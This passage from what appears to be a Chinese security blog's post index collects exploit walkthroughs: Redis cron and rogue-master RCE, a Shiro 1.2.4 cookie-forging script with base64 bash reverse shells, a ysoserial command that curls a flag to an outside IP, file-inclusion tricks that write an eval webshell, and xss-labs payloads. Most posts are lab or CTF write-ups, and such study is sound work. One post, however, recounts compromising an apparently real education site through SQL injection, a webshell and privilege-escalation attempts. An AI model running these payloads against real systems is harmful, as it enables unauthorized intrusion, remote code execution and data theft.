* /bin/bash -i>&/dev/tcp/攻击机ip/4444 0>&1\\n\\n\\n\"\nsave\n```\n\n攻击机监听\n```bash\nnc -lvp 4444\n```\n靶场不是root权限运行的redis演示不了\n\n## EXP-利用主从复制RCE\nRedis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。\n\n[exp下载地址](https://github.com/vulhub/redis-rogue-getshell)\n\n- 编译\n```bash\ncd RedisModulesSDK/\nmake\n```\n\n- 使用\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022100318.png)\n\n```bash\npython3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c \"id\"\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022107518.png)\n\n","tags":["vulhub","redis"],"categories":["漏洞复现"]},{"title":"Shiro1.2.4反序列化漏洞复现","url":"/2022/06/02/Shiro1-2-4反序列化漏洞复现/","content":"\n#  漏洞解析\nApache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）\nApache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。\nApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。\n\n# 漏洞环境\n使用vulhub环境\n执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：\n```bash\ncd vulhub/shiro/CVE-2016-4437\ndocker-compose up -d\n```\n服务启动后，访问http://your-ip:8080可使用admin:vulhub进行登录。\n\n# 漏洞复现\n登录\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png)\n\n## 利用工具-ShiroAttack2\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021349099.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021349877.png)\n\n## 手工复现\n登录抓包\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021343076.png)\n\nshiro漏洞指纹\n在请求包的Cookie中为？remeberMe字段赋任意值\n返回包中存在set-Cookie：remeberMe=deleteMe\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021415805.png)\n\n### 反弹shell\n制作反弹shell序列化数据\n\n将命令进行base64编码\n```bash\nbash -i >& /dev/tcp/192.168.0.1/4444 0>&1\n```\n\n得到payload\n```bash\nbash -c {'echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE='}|{base64,-d}|{bash,-i}\n```\n\n通过ysoserial工具中的JRMP监听模块，监听6666端口并执行反弹shell命令，\n```bash\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {'echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS80NDQ0IDA+JjE='}|{base64,-d}|{bash,-i}'\n```\n\n### 构造payload\n使用python构造payload,秘钥为Shiro默认秘钥\n```python\nimport sys\n\nimport uuid\nimport base64\nimport subprocess\nfrom Crypto.Cipher import AES\n\ndef encode_rememberme(command):\n    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")\n    iv = uuid.uuid4().bytes\n    encryptor = AES.new(key, AES.MODE_CBC, iv)\n    file_body = pad(popen.stdout.read())\n    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))\n    return base64_ciphertext\nif __name__ == '__main__':\n    payload = encode_rememberme(sys.argv[1])\n    print(\"rememberMe={0}\".format(payload.decode()))\n```\n\n执行\n```bash\npython3 AES.py ip:6666\n```\n\n获得pyload\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021454232.png)\n\n\nnc 监听\n```bash\nnc lvp 4444\n```\n\n伪造cookie发送\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021512925.png)\n\n反弹shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021513505.png)\n\n\n## 总结\n漏洞产生的根本原因就是因为AES加密的key硬编码在源码中，从而可以被攻击者利用泄露的AES key伪造rememberMe字段生成cookie值，导致反序列化漏洞。因此，服务器端对cookie值的处理过程反过来就是payload的产生过程：命令=>进行序列化=>AES加密=>base64编码=>产生RememberMe Cookie值。","tags":["反序列化","Apache","shiro","vulhub"],"categories":["漏洞复现"]},{"title":"CTF-反序列化","url":"/2022/05/31/CTF-反序列化/","content":"# 漏洞详解\n反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。\n序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。\n简单来说,序列化就像是把数据加密,像json一样的格式,反序列化就是解密成原来的样子\n\n\n\n# 漏洞可能出现的位置\n1. 解析认证token、session的位置\n2. 将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等\n3. 将对象序列化后在网络中传输，如传输json数据，xml数据等\n4. 参数传递给程序\n5. 使用RMI协议，被广泛使用的RMI协议完全基于序列化\n6. 使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等\n7. 定义协议用来接收与发送原始的java对象\n\n# PHP反序列化\n![](https://raw.githubusercontent.com/chencicici/images/main/202205311958842.png)\n\n原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。\n\n## 魔术方法\n```php\n__construct()\n具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。\n__destruct()\n析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁,代码结束时执行。\n```\n[PHP魔术方法详解](https://www.cnblogs.com/20175211lyz/p/11403397.html)\n\n## 序列化实例\n[PHP代码在线执行](https://www.dooccn.com/php/)\n```php\nserialize() //将一个对象转换成一个字符串\nunserialize() //将字符串还原成一个对象\n```\n\n序列化\n```php\n<?php\n$key=\"syst1m\";\necho serialize($key);\n?>\n```\n\n输出\n```\ns:6:\"syst1m\";\n```\n\n\n反序列化\n```php\n<?php\n$key='s:6:\"syst1m\"';\necho unserialize($key);\n?>\n```\n\n输出\n```\nsyst1m\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312020809.png)\n\n\n## bugku-点login咋没反应\n地址\n[bugku](https://ctf.bugku.com/challenges/detail/id/109.html)\n\n打开页面\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312156157.png)\n\n登录,发现没反应,根本没有表单提交\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312158710.png)\n\n查看源码,有一个css文件\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312159492.png)\n\n打开发现提示\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312200927.png)\n\n输入http://url/?32145,页面回显源码\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312202898.png)\n\n\n````php\n<?php\nerror_reporting(0);\n$KEY='ctf.bugku.com';\ninclude_once(\"flag.php\");\n$cookie = $_COOKIE['BUGKU'];\nif(isset($_GET['32145'])){\n    show_source(__FILE__);\n}\nelseif (unserialize($cookie) === \"$KEY\")\n{   \n    echo \"$flag\";\n}\nelse {\n?>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<title>Login</title>\n<link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\">\n</head>\n<body>\n<br>\n<div class=\"container\" align=\"center\">\n  <form method=\"POST\" action=\"#\">\n    <p><input name=\"user\" type=\"text\" placeholder=\"Username\"></p>\n    <p><input name=\"password\" type=\"password\" placeholder=\"Password\"></p>\n    <p><input value=\"Login\" type=\"button\"/></p>\n  </form>\n</div>\n</body>\n</html>\n\n<?php\n}\n?>\n````\n### 代码审计\n判断cookie中是否携带参数'BUGKU'\n此处有一个坑,进入代码后判断get提价的数据是否为32145,不成立判断,反序列化$cookie是否等于$key,成立输出flag\n所以我们在提交数据的时候,就不能带参数32145\n```php\nif(isset($_GET['32145'])){\n    show_source(__FILE__);\n}elseif (unserialize($cookie) === \"$KEY\")\n{   \n    echo \"$flag\";\n}\n```\n\n### payload\n\n```php\n<?php\n\n$KEY='ctf.bugku.com';\necho serialize($KEY);\n?>\n```\n\n获得值\n```\ns:13:\"ctf.bugku.com\";\n```\n\n带入cookie中去请求,不带url中不能携带32145参数\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312212892.png)\n\n\n## 网鼎杯2020青龙组-AreUSerialz \n地址\n[ctfhub-AreUSerialz](https://www.ctfhub.com/#/challenge)\n\n打开环境就显示源码\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312033140.png)\n\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n### 代码审计\n首先是一道有类反序列化题\n\n接受str参数, 执行`is_valid()`函数,执行unserialize()函数,反序列化\n```php\nif(isset($_GET{'str'})) {\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n}\n```\n\nis_valid()函数检查对象变量是否已经实例化,序列化则返回\n```php\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n```\n\n进入首先先执行构造方法,定义变量,执行`process()`方法\n```php\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n```\n\n跟踪process()函数,判断`$op`,使用`==`,圈起来要考!!判断是否等于\"1\",成立执行`write()`函数\n不成立往下走再判断是否等于\"2\",成立执行`read()`\n`read()`函数,会返回包含文件的内容,也就是flag\n```php\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n```\n上述皆不成立输出 Bad Hacker!\n```php\n public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n```\n\n因为一开始构造函数,赋值了$op的值等于\"1\",所以跟踪`write()`,可以发现`write()`,仅执行一些输入语句就结束了,和flag无关,所有不能执行`write()`函数\n\n\n```php\nprivate function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n```\n\n代码全部完执行,对象被销毁,执行析构方法,使用`===`判断是否等于\"2\",成立再赋值为\"1\",否则执行process()\n```php\nfunction __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n```\n\n所以在process()函数里,就不能执行`write()`函数,要执行`read()`函数,$op==\"2\"就不能成立,此处判断使用`==`而不是`===`\n校验并不严格,所以我们可以使用\" 2\",此处是空格2,构造序列化数据去绕过\n\n### 构造数据\n\n```php\n\n```\n输出\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";s:2:\" 2\";s:8:\"filename\";s:12:\"/tmp/tmpfile\";s:7:\"content\";s:12:\"Hello World!\";}\n```\n\n\n### payload\n```php\n<?php\nclass FileHandler {\n\n    public $op = \" 2\";\n    public $filename = \"flag.php\";\n    public $content;\n\n    }\n$a = new FileHandler();\necho serialize($a);\n?>\n```\n输出\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";s:2:\" 2\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n提交数据\n```\nurl/?str=O:11:\"FileHandler\":3:{s:2:\"op\";s:2:\"%202\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n源代码查看flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202205312147133.png)\n\n\n# JAVA反序列化\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820673.png)\n\nJava中通常使用Java.io.ObjectOutputStream类中的writeObject方法进行序列化\njava.io.ObjectInputStream类中的readObject方法进行反序列化。\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820623.png)\n\n## 特征 \n![](https://raw.githubusercontent.com/chencicici/images/main/202206011820429.png)\n\n\n## 反序列化漏洞实验\n\n\n### 序列化\n将\"hello\"以序列化写入a.ser文件\n\n```Java\npackage com.example;\nimport java.io.ObjectOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileInputStream;\n\npublic class writeObject {\n    public static void main(String args[]) throws Exception {\n        String obj = \"hello\";\n\n        // 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时， 按照 Java 的标准约定是给文件一个 .ser 扩展名\n        FileOutputStream fos = new FileOutputStream(\"a.ser\");\n        ObjectOutputStream os = new ObjectOutputStream(fos);\n        os.writeObject(obj);\n        os.close();\n\n        // 从文件a.ser中读取数据\n        FileInputStream fis = new FileInputStream(\"a.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n\n        // 通过反序列化恢复字符串\n        String obj2 = (String)ois.readObject();\n        System.out.println(obj2);\n        ois.close();\n    }\n}\n```\n\n以16进制打开a.ser\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011835256.png)\n\n以aced开头,Java序列化数据格式始终以双字节的十六进制0xAC ED作为开头，Base64编码之后为rO0A。\n\n### 反序列化\n将a.ser反序列化\n```Java\npackage com.example;\n\n\nimport java.io.ObjectInputStream;\nimport java.io.FileInputStream;\nimport java.io.Serializable;\nimport java.io.IOException;\n\n// 定义一个实现 java.io.Serializable 接口的类Test\nclass Test implements Serializable {\n    public String cmd=\"calc\";\n    // 重写readObject()方法\n    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\n        // 执行默认的readObject()方法\n        in.defaultReadObject();\n        // 执行打开计算器程序的命令\n        Runtime.getRuntime().exec(cmd);\n    }\n}\n\npublic class Main{\n\n    public static void main(String args[]) throws Exception{\n        // 从a.ser文件中反序列化test对象\n        FileInputStream fis = new FileInputStream(\"a.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Test objectFromDisk = (Test)ois.readObject();\n        System.out.println(objectFromDisk.cmd);\n        ois.close();\n    }\n}\n```\n\n## 网鼎杯think_java\n打开环境,下载题目附件,丢idea里\n\n### 代码审计\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011924879.png)\n\n发现可疑文件名`sqldict`,跟进查看,并未对参数做过滤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011927102.png)\n\n继续审计,发现存在api接口,/swagger-ui.html\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011930008.png)\n\n### 访问接口\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011942906.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011944415.png)\n\n\n### payload\n代码审计出,此处存在注入,需要使用#或?闭合掉前面的语句,因为此语句也用来连接jdbc\n```\nmyapp#' union/**/select/**/database()#\nmyapp#'union/**/select/**/group_concat(column_name)from(information_schema.columns)where(table_name='user')and(table_schema='myapp')#\nmyapp#'union/**/select/**/name from user#\nmyapp#'union/**/select/**/pwd from user#\n```\n\n查出账号密码\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012010419.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206011959293.png)\n\n登录获取cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012012443.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012013818.png)\nBase64加密过后的序列化数据\n\n放入cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012016486.png)\n\n这里应该就是将数据反序列化\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012016703.png)\n\n### nc反弹\n使用ysoserial构造序列化数据\n\n```bash\njava -jar ysoserial.jar ROME \"curl http://162.14.73.93:4444 -d @flag\" |base64\n```\n监听端口\n![](https://raw.githubusercontent.com/chencicici/images/main/202206012100951.png)\n\n没有外网ip,内网穿透,不知道为什么试了很多次反弹不回来...\n","tags":["CTF","反序列化"],"categories":["CTF"]},{"title":"报错注入getshell到提权","url":"/2022/05/29/报错注入getshell到提权/","content":"# 前言\n梦到一个网站,然后getshell\n\n# fuzz\ngoogle插件识别到指纹,apache+php\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292244063.png)\n\n\n扫了下目录,爆出绝对路径\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292246104.png)\n\n\n看到php?tbsn=xx,上fuzz大法,最后试出来报错注入\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292249932.png)\n\n手工注入不行,直接丢sqlmap,站点是个edu数据多得很,断断续续跑了半天\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292254846.png)\n\n弱密码yyds\n\n直接登录,完全没有校验,直接传一句话getshell\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292257176.png)\n\n权限很低\n\n# 提权\n脏牛提权,提不动,原因暂时不知道\n![](https://raw.githubusercontent.com/chencicici/images/main/202205292319343.png)\n\n","tags":["sql注入","提权","getshell"],"categories":["渗透实战"]},{"title":"CTF-文件包含","url":"/2022/05/26/CTF-文件包含/","content":"# 文件包含解析\n    文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：\n    include(),include_once()\n    require(),require_once()\n    这些文件包含函数，这些函数在代码设计中被经常使用到。\n    大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：\n    1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。\n    2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。\n    因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。\n   \n![](https://raw.githubusercontent.com/chencicici/images/main/202205262150221.png)\n\n\n# 各种语言的文件包含\n```aspx\n<!--#include file=\"1.asp\" -->\n\n<!--#include file=\"top.aspx\" -->\n```\n\n```jsp\n<c:import url=\"http://thief.one/1.jsp\">\n<jsp:include page=\"head.jsp\"/>\n<%@ include file=\"head.jsp\"%>\n```\n\n```php\n<?php Include('test.php')?>\n```\n\n# 绕过\n一些绕过文件包含之后添加后缀的方法\n\n## %00截断\n- 条件 \n    magic_quotes_gpc = Off\n    php版本<5.3.4\n  \n```bash\nfilename=…/…/…/www.txt%00\n```\n\n## 长度截断\n类似于脏数据填充\n\n- 条件\n    windows:`.`长于256\n    linux:`.`长于4096\n  \n\n```bash\nfilename=…/…/…/www.......256个或者4096个......txt\n```\n## ?号截断\n不受GPC和PHP版本的影响，webserver会把问号当作请求的参数\n\n```bash\nfilename=1.txt?\n```\n\n## 特殊符号截断\n```bash\n%23\n%20\n```\n\n# 远程包含\n需要在php.ini中打开`allow_url_include`配置项\n\n## 实例\n```bash\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%20\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt%23\nhttp://127.0.0.1:8080/include.php?filename=http://www.xxx.com/readme.txt?\n```\n\n# 各种伪协议\n[参考](https://www.cnblogs.com/endust/p/11804767.html)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262203868.png)\n\n```bash\nhttp://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt\nhttp://127.0.0.1:8080/include.php?filename=php://input Post:<?php system('ver')?>\n<?PHP fputs(fopen('s.php','w'),'<?php @eval($_POST[cmd])?>');?>\nhttp://127.0.0.1:8080/include.php?filename=file:///D:/phpstudy/PHPTutorial/WWW/1.txt\nhttp://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>\n```\n\n# 赛题\n[南邮CTF平台-文件包含](http://4.chinalover.sinaapp.com/web7/index.php)\n\n使用文件包含读取,返回base64编码过后的源码\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262236992.png)\n\n解码得到flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262238320.png)\n","tags":["CTF","文件包含"],"categories":["CTF"]},{"title":"awvs联动xray扫描","url":"/2022/05/24/awvs联动xray扫描/","content":"awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。\n[xray官方手册](https://docs.xray.cool/#/scenario/awvs)\n\n# awvs安装\n[docker镜像地址](https://hub.docker.com/r/secfa/awvs)\n\n```bash\n#  pull 拉取下载镜像\ndocker pull secfa/docker-awvs\n\n#  将Docker的3443端口映射到物理机的 13443端口\ndocker run -it -d -p 13443:3443 secfa/docker-awvs\n\n# 容器的相关信息\nusername: admin@admin.com\npassword: Admin123\nAWVS版本：14\n\n#如何更改凭据\n\n1.docker exec -u root -it $docker_names /bin/bash\n2./home/acunetix/.acunetix/change_credentials.sh\n3.输入您的新凭证\n```\n\n# xray安装\n[下载地址](https://github.com/chaitin/xray/releases)\n\n将xray添加为命令\n```bash\n## xray\nalias xray=\"/xray/xray_darwin_amd64\" #xray路径\nexport alias\n```\n\n# 联合使用\n\n- 启动xray\n首先启动 xray 的被动代理，下面的命令将启动一个监听在所有网卡 1111 端口的 HTTP 代理, 并将扫描结果保存在 awvs.html 内。\n```bash\nxray webscan --listen 0.0.0.0:1111 --html-output awvs.html\n```  \n![](https://raw.githubusercontent.com/chencicici/images/main/202205242323790.png)\n\n\n\n- 启动awvs\n    打开awvs如果浏览器报 不是私密链接且没有继续访问,在awvs页面直接输入`thisisunsafe`,浏览器会自动跳转\n  \n    添加目标并设置为仅爬取,此处使用本地靶场环境\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242324038.png)\n  \n    使用xray的代理,因为是docker环境,ip为`物理机的内网ip`,不能写127.0.0.1或者localhost,这样awvs容器才可以找到,如果xray在公网就写公网ip\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242326873.png)\n  \n    \n  \n- 扫描\n点击扫描后终端出现回显则表示成功\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205242329664.png)\n  \n    扫描结束后会出现一个awvs.html就是扫描结果,使用浏览器打开\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205242331538.png)\n  \n","tags":["awvs","xray"],"categories":["工具使用"]},{"title":"xss-labs靶场","url":"/2022/05/19/xss-labs靶场/","content":"# less-01\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"<h2 align=center>欢迎用户\".$str.\"</h2>\";\n?>\n```\n反射型xss,无过滤\n\n- payload\n对于XSS漏洞，在实战中未避免因关键字被发现，多采用h5标签进行试探。\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191420542.png)\n  注入XSS\n  \n    ```js\n    name=<script>alert('xss')</script>\n    ```\n\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205191428059.png)\n\n\n# less-02\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level2.php method=GET>\n<input name=keyword  value=\"'.$str.'\">\n<input type=submit name=submit value=\"搜索\"/>\n</form>\n</center>';\n?>\n```\n反射型XSS,`htmlspecialchars($str)`过滤,把预定义的字符 \"<\" （小于）和 \">\" （大于）转换为 HTML 实体\n\n- payload \n  此处需要将突破点转向value，首先应该闭合标签（“>），在进行xss注入。\n  \n    ```js\n    keyword=\"><script>alert(1)</script>\n    ```\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202205191444081.png)\n  \n\n# less-03\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".\"<center>\n<form action=level3.php method=GET>\n<input name=keyword  value='\".htmlspecialchars($str).\"'>\n<input type=submit name=submit value=搜索 />\n</form>\n</center>\";\n?>\n<center><img src=level3.png></center>\n<?php \n```\nstr和value都被`.htmlspecialchars($str)`过滤\n\n- payload\n值得注意的是,value位于input标签上,可以使用鼠标事件绕过\n  ```js\n    \" onfocus='javascript:alert(1)'\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191503368.png)\n\n# less-04\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\">\",\"\",$str);\n$str3=str_replace(\"<\",\"\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level4.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n在上一关的基础上,替换`<` `>`\n\n- payload\n  依旧可以使用特殊鼠标事件绕过\n  ```js\n  \" onfocus='javascript:alert(1)'\n  ```\n  \n# less-05\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n在上关的基础上,替换`on`,并且全部小写,使用超链接绕过\n\n- payload\n  ```js\n  \"> <a href=\"javascript:alert(/xss/)\">xss</a>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191520214.png)\n\n\n# less-06\n- 源码\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level6.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n\n```\n在上一关的基础上,增加了更多替换,但是没有替换大小写\n\n- payload\n使用大小写绕过\n  ```js\n  \"><Script>alert(1);</script>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191526138.png)\n\n# less-07\n\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>没有找到和\".htmlspecialchars($str).\"相关的结果.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=搜索 />\n</form>\n</center>';\n?>\n```\n在上一关的基础上替换为小写,无法使用大小写绕过,但是关键字替换为空\n\n- payload\n使用双写绕过\n  ```js\n  